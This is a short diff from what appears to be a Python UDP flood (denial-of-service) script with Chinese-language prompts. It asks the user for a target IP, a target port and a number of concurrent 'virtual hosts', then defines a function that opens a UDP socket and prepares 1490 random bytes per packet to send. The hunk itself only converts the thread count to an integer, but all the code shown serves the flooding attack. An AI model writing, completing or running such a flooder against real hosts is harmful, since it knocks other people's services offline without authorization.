@@ -23,6 +23,8 @@ ip = input("目标IP:")
 port = int(input("目标端口:"))
 many = input("虚拟主机数量(注意不要太高,除非家里有条件):")
 
+many = int(many)
+
 def send_packets():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes_to_send = random._urandom(1490)
